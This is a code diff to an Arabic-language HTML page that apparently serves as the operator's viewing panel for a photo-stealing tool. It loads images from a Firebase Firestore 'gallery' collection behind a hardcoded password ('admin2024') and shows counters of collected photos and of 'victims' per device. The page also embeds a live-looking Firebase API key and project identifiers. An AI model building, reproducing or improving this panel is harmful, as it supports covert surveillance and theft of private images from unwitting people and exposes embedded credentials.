@@ -3,47 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📱 المعرض</title>
+    <title>📸 المعرض</title>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
     <style>
-        :root { --green: #00ff41; }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Courier New', monospace; background: #000; color: #fff; min-height: 100vh; padding: 20px; }
-        h1 { text-align: center; color: var(--green); margin-bottom: 16px; font-size: 20px; }
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .card { background: #0a0a0a; border: 1px solid var(--green); border-radius: 8px; overflow: hidden; }
-        .card img { width: 100%; height: 150px; object-fit: cover; display: block; }
-        .card .info { padding: 6px; font-size: 9px; color: #555; }
-        .empty { text-align: center; color: #333; margin-top: 40px; font-size: 14px; }
-        .refresh-btn { display: block; margin: 16px auto; padding: 10px 30px; background: #0a1a0a; border: 1px solid var(--green); color: var(--green); border-radius: 20px; cursor: pointer; font-family: 'Courier New', monospace; font-size: 14px; }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;padding:16px}
+        .container{max-width:800px;margin:0 auto}
+        .header{text-align:center;margin-bottom:20px}
+        h1{color:#ff0040;font-size:24px;text-shadow:0 0 20px #ff0040;margin:10px 0}
+        .sub{color:#666;font-size:12px;margin-bottom:20px}
+        .gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
+        .gallery-item{position:relative;border-radius:10px;overflow:hidden;aspect-ratio:1;background:#111;border:1px solid #333;cursor:pointer}
+        .gallery-item img{width:100%;height:100%;object-fit:cover}
+        .gallery-item .info{position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.7);padding:6px;font-size:10px;color:#aaa}
+        .empty{text-align:center;color:#666;padding:40px;font-size:14px}
+        .modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:999;justify-content:center;align-items:center;padding:20px}
+        .modal.show{display:flex}
+        .modal img{max-width:95%;max-height:85vh;border-radius:10px}
+        .modal .close{position:absolute;top:20px;right:20px;color:#fff;font-size:30px;cursor:pointer;background:rgba(255,0,0,0.5);width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center}
+        .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:20px}
+        .stat-box{background:#111;border:1px solid #333;border-radius:10px;padding:14px;text-align:center}
+        .stat-box .num{color:#ff0040;font-size:22px;font-weight:bold}
+        .stat-box .txt{color:#666;font-size:10px;margin-top:4px}
+        .refresh-btn{width:100%;padding:12px;background:#0a0a0a;border:1px solid #333;color:#fff;border-radius:8px;cursor:pointer;font-size:14px;margin-bottom:16px}
+        .password-box{background:#0a0a0a;border:2px solid #ff0040;border-radius:12px;padding:20px;text-align:center;max-width:400px;margin:100px auto}
+        .password-box input{width:100%;padding:14px;background:#000;border:1px solid #333;border-radius:8px;color:#fff;font-size:14px;margin-bottom:10px;outline:none;text-align:center}
+        .password-box button{width:100%;padding:14px;background:#ff0040;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
     </style>
 </head>
 <body>
-<h1>📱 المعرض</h1>
-<button class="refresh-btn" onclick="loadGallery()">🔄 تحديث</button>
-<div class="grid" id="gallery"></div>
+<div class="container">
+    <div class="header">
+        <h1>📸 المعرض</h1>
+        <p class="sub">جميع الصور المجمعة</p>
+    </div>
+
+    <div id="loginScreen" class="password-box">
+        <h2 style="color:#ff0040;margin-bottom:14px;">🔐 كلمة المرور</h2>
+        <input type="password" id="galleryPass" placeholder="أدخل كلمة المرور">
+        <button onclick="login()">💀 دخول</button>
+    </div>
+
+    <div id="galleryContent" style="display:none;">
+        <div class="stats">
+            <div class="stat-box"><div class="num" id="statPhotos">0</div><div class="txt">صورة</div></div>
+            <div class="stat-box"><div class="num" id="statVictims">0</div><div class="txt">ضحية</div></div>
+            <div class="stat-box"><div class="num" id="statToday">0</div><div class="txt">اليوم</div></div>
+            <div class="stat-box"><div class="num" id="statTotal">0</div><div class="txt">الإجمالي</div></div>
+        </div>
+
+        <button class="refresh-btn" onclick="loadGallery()">🔄 تحديث</button>
+
+        <div class="gallery" id="gallery">
+            <div class="empty">⏳ جاري التحميل...</div>
+        </div>
+    </div>
+
+    <div class="modal" id="modal" onclick="closeModal()">
+        <span class="close">✕</span>
+        <img id="modalImg" src="" alt="">
+    </div>
+</div>
 
 <script>
-function loadGallery() {
-    const data = JSON.parse(localStorage.getItem('hacke_gallery') || '[]');
-    const gallery = document.getElementById('gallery');
-    gallery.innerHTML = '';
-    
-    if (data.length === 0) {
-        gallery.innerHTML = '<div class="empty">لا توجد صور</div>';
-        return;
+var GALLERY_PASS = 'admin2024';
+var db;
+
+firebase.initializeApp({
+    apiKey: "AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",
+    projectId: "game-a1aca",
+    storageBucket: "game-a1aca.firebasestorage.app",
+    appId: "1:598280425947:android:0e4ead8d9b50cfc92157fe"
+});
+db = firebase.firestore();
+
+function login() {
+    var pass = document.getElementById('galleryPass').value;
+    if (pass === GALLERY_PASS) {
+        document.getElementById('loginScreen').style.display = 'none';
+        document.getElementById('galleryContent').style.display = 'block';
+        loadGallery();
+    } else {
+        alert('❌ كلمة مرور خاطئة');
     }
-    
-    data.reverse().forEach(item => {
-        const card = document.createElement('div');
-        card.className = 'card';
-        const src = `data:image/jpeg;base64,${item.data}`;
-        card.innerHTML = `<img src="${src}"><div class="info">📸 ${new Date(item.time).toLocaleString('ar-EG')} | ${item.device || ''}</div>`;
-        gallery.appendChild(card);
-    });
 }
 
-loadGallery();
-setInterval(loadGallery, 5000);
+async function loadGallery() {
+    try {
+        var snapshot = await db.collection('gallery').orderBy('timestamp','desc').limit(100).get();
+        var photos = [];
+        snapshot.forEach(function(doc) {
+            photos.push(doc.data());
+        });
+
+        document.getElementById('statPhotos').textContent = photos.length;
+        document.getElementById('statTotal').textContent = photos.length;
+
+        var today = new Date().toDateString();
+        var todayCount = 0;
+        var victims = {};
+        
+        photos.forEach(function(p) {
+            if (p.timestamp && new Date(p.timestamp).toDateString() === today) todayCount++;
+            if (p.device) victims[p.device] = true;
+        });
+
+        document.getElementById('statToday').textContent = todayCount;
+        document.getElementById('statVictims').textContent = Object.keys(victims).length;
+
+        var html = '';
+        if (photos.length === 0) {
+            html = '<div class="empty">📭 لا توجد صور بعد</div>';
+        } else {
+            photos.forEach(function(p) {
+                html += '<div class="gallery-item" onclick="openModal(\'' + p.url + '\')">';
+                html += '<img src="' + p.url + '" alt="" loading="lazy">';
+                html += '<div class="info">' + (p.type || '📸') + ' | ' + (p.timestamp ? new Date(p.timestamp).toLocaleString('ar-EG') : '') + '</div>';
+                html += '</div>';
+            });
+        }
+        document.getElementById('gallery').innerHTML = html;
+    } catch(e) {
+        document.getElementById('gallery').innerHTML = '<div class="empty">❌ فشل التحميل</div>';
+    }
+}
+
+function openModal(url) {
+    document.getElementById('modalImg').src = url;
+    document.getElementById('modal').classList.add('show');
+}
+
+function closeModal() {
+    document.getElementById('modal').classList.remove('show');
+}
+
+document.getElementById('galleryPass').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') login();
+});
 </script>
 </body>
 </html>
